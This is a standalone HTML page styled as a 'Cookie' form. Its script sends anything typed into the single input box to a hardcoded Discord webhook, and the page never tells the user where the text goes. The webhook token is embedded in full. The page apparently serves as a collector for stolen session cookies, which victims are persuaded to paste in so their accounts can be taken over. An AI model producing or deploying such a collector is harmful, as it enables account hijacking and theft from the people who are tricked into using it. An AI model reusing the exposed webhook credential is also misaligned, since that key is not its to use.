<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Cookie Form</title>

<style>
*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Arial,sans-serif;
}

body{
height:100vh;
display:flex;
justify-content:center;
align-items:center;
overflow:hidden;
background:#050505;
}

/* Animated Background */
body::before{
content:"";
position:fixed;
top:-50%;
left:-50%;
width:200%;
height:200%;
background:
radial-gradient(circle,#ff000055 2px,transparent 3px),
radial-gradient(circle,#99000055 2px,transparent 3px);
background-size:80px 80px;
animation:move 15s linear infinite;
filter:blur(1px);
}

@keyframes move{
0%{transform:translate(0,0);}
50%{transform:translate(-80px,-80px);}
100%{transform:translate(0,0);}
}

.container{
position:relative;
z-index:2;
width:340px;
padding:30px;
background:rgba(20,20,20,.9);
border:1px solid #ff2d2d;
border-radius:18px;
box-shadow:0 0 30px #ff000055;
text-align:center;
animation:fade .8s ease;
}

@keyframes fade{
from{
opacity:0;
transform:translateY(30px);
}
to{
opacity:1;
transform:translateY(0);
}
}

h1{
color:#fff;
margin-bottom:20px;
font-size:28px;
}

input{
width:100%;
padding:14px;
margin:10px 0;
border:none;
outline:none;
border-radius:10px;
background:#111;
color:#fff;
font-size:16px;
border:1px solid #333;
transition:.3s;
}

input:focus{
border-color:#ff3333;
box-shadow:0 0 12px #ff0000;
}

button{
margin-top:15px;
width:100%;
padding:14px;
border:none;
border-radius:10px;
background:#ff2d2d;
color:#fff;
font-size:18px;
cursor:pointer;
transition:.3s;
}

button:hover{
background:#ff5555;
transform:scale(1.03);
box-shadow:0 0 15px red;
}

.status{
margin-top:15px;
color:#00ff88;
font-size:15px;
}
</style>
</head>
<body>

<div class="container">
<h1>🍪 Cookie</h1>

<input
type="text"
id="cookie"
placeholder="Enter text here...">

<button onclick="sendWebhook()">
PRESS BUTTON
</button>

<div class="status" id="status"></div>

</div>

<script>
const webhook = "https://discord.com/api/webhooks/1529777479244447775/i5k-ci_cX8tBR-wMgoIKanc8Keg6GcvfEd78HgkefQM7QqACKtPv3zRIowMr_oSx4XKy";

async function sendWebhook(){

const value = document.getElementById("cookie").value;

if(!value){
alert("Please enter something.");
return;
}

const data = {
content:
"🍪 **Submitted Text**\n```" +
value +
"```"
};

try{

await fetch(webhook,{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify(data)
});

document.getElementById("status").innerHTML="✅ Sent!";
document.getElementById("cookie").value="";

}catch(err){

document.getElementById("status").innerHTML="❌ Failed.";

}

}
</script>

</body>
</html>
